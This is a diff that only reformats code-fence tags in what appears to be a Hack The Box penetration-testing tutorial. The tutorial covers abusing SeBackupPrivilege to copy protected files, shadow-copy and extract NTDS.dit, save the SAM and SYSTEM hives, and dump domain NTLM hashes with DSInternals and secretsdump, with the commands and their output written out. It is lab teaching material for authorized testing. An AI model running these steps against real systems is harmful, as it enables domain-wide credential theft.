@@ -21,8 +21,7 @@ We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to explo
 
 #### Importing Libraries
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
 PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
@@ -33,8 +32,7 @@ Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get
 
 Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
 
-```
-        powershell
+```powershell
 PS C:\htb> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -50,8 +48,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-SeBackupPrivilege
 
 SeBackupPrivilege is disabled
@@ -61,16 +58,14 @@ SeBackupPrivilege is disabled
 
 If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.
 
-```
-        powershell
+```powershell
 PS C:\htb> Set-SeBackupPrivilege
 PS C:\htb> Get-SeBackupPrivilege
 
 SeBackupPrivilege is enabled
 ```
 
-```
-        powershell
+```powershell
 PS C:\htb> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -90,8 +85,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
 As we can see above, the privilege was enabled successfully. This privilege can now be leveraged to copy any protected file.
 
-```
-        powershell
+```powershell
 PS C:\htb> dir C:\Confidential\
 
     Directory: C:\Confidential
@@ -111,8 +105,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
 ```
 
-```
-        powershell
+```powershell
 PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
 
 Copied 88 bytes
@@ -136,8 +129,7 @@ This group also permits logging in locally to a domain controller. The active di
 
 As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.
 
-```
-        powershell
+```powershell
 PS C:\htb> diskshadow.exe
 
 Microsoft DiskShadow version 1.0
@@ -174,8 +166,7 @@ d-----        3/24/2021   6:38 PM                Windows
 
 Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.
 
-```
-        powershell
+```powershell
 PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
 Copied 16777216 bytes
@@ -185,8 +176,7 @@ Copied 16777216 bytes
 
 The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
 
-```
-        cmd
+```bat
 C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
 
 The operation completed successfully.
@@ -202,8 +192,7 @@ It's worth noting that if a folder or file has an explicit deny entry for our cu
 
 With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals`.
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module .\DSInternals.psd1
 PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
 PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
@@ -273,8 +262,7 @@ Credential Roaming
 
 We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, creating a dictionary of disallowed words, etc.).
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 
 Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
@@ -305,8 +293,7 @@ printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:
 
 The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.
 
-```
-        cmd
+```bat
 C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
 
 -------------------------------------------------------------------------------
